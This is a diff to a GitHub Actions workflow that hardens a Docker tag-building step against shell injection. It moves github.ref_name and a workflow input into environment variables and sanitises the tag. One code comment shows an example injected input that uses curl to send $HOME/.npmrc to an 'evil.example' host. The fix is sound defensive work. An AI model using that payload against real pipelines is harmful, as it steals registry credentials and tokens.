@@ -85,9 +85,24 @@ jobs:
           images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
 
       - name: Combine Docker tags
+        env:
+          # Read back as shell variables, never interpolated into the script
+          # text. GitHub substitutes ${{ }} before bash parses the line, so an
+          # fe_ref of `$(curl evil.example -d @$HOME/.npmrc)` would execute in
+          # this job, which holds DOTYOUCORE_LIB_TOKEN.
+          REF_NAME: ${{ github.ref_name }}
+          FE_REF: ${{ github.event.inputs.fe_ref }}
         run: |
-          lowercase_image_tags=$(echo "${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.ref_name }}__${{ github.event.inputs.fe_ref }}" | tr '[:upper:]' '[:lower:]')
-          echo "IMAGE_WITH_TAG=$lowercase_image_tags" >> $GITHUB_ENV
+          # Sanitised to the docker tag character set, which is also the
+          # bleeding_edge allowlist run-playbook.sh enforces on the ansible controller:
+          # ^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$. Without this, a tag built here
+          # cannot be deployed by "Host: Deploy an image tag to an environment".
+          tag="$(printf '%s' "${REF_NAME}__${FE_REF}" | tr '[:upper:]' '[:lower:]' | tr -c 'a-z0-9._-' '-')"
+          tag="${tag:0:128}"
+          [[ "$tag" =~ ^[a-z0-9] ]] || tag="x${tag:0:127}"
+          image="$(printf '%s' "${REGISTRY}/${IMAGE_NAME}" | tr '[:upper:]' '[:lower:]')"
+          echo "IMAGE_WITH_TAG=${image}:${tag}" >>"$GITHUB_ENV"
+          echo "Image tag: ${tag}"
 
       - name: Build and push Docker image
         uses: docker/build-push-action@v5.3.0
